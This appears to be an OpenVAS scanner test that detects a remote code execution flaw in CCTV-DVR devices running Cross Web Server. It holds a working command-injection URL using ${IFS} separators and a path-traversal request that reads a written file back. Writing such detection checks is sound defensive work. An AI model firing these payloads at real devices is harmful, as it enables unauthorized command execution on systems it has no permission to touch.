###############################################################################
# OpenVAS Vulnerability Test
#
# Multiple CCTV-DVR Vendors - Remote Code Execution Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807674");
  script_version("2022-02-18T14:45:11+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2022-02-18 14:45:11 +0000 (Fri, 18 Feb 2022)");
  script_tag(name:"creation_date", value:"2016-04-20 15:15:28 +0530 (Wed, 20 Apr 2016)");
  script_name("Multiple CCTV-DVR Vendors RCE Vulnerability");

  script_tag(name:"summary", value:"The remote CCTV-DVR system is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an improper validation in implementation of
  the HTTP server.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary script code in a user's browser session and allows any remote user to read configuration
  files from the application.");

  script_tag(name:"affected", value:"Please see the references for a list of affected vendors.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39596");
  script_xref(name:"URL", value:"http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Cross_Web_Server/banner");
  script_require_ports("Services/www", 82);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");

port = http_get_port(default:82);

banner = http_get_remote_headers(port: port);
if(!banner || banner !~ "Server\s*:\s*Cross Web Server")
  exit(0);

url = "/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js";

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req);

if(buf && "Cross couldn't find this file" >< buf) {

  req1 = http_get(item:"/../../../../../../../mnt/mtd/test", port:port);
  buf1 = http_keepalive_send_recv(port:port, data:req1, bodyonly:TRUE);

  if("1" >< buf1 && strlen(buf1) == 2) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);

    req = http_get(item:"/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js", port:port);
    http_keepalive_send_recv(port:port, data:req);

    exit(0);
  }
}

exit(99);
